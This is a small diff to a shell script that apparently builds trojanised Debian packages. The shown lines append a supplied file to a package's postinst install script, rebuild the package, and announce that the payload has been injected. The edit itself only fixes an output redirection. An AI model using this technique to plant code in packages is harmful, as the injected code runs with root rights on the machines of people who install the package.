@@ -64,7 +64,7 @@ then
     cat ${4} >> ${2/.deb/evil}/DEBIAN/postinst
     echo -e " ${BULE}[+] bulid the ${2}  ${RESET}"
     dpkg-deb --build ${2/.deb/evil} > /dev/null;
-    sudo rm -r ${2/.deb/evil} /dev/null;
+    sudo rm -r ${2/.deb/evil} > /dev/null;
     echo -e " ${GREEN}[+] the payload has been successfully injected into the Debian package ${RESET}"
     exit 1
 else 
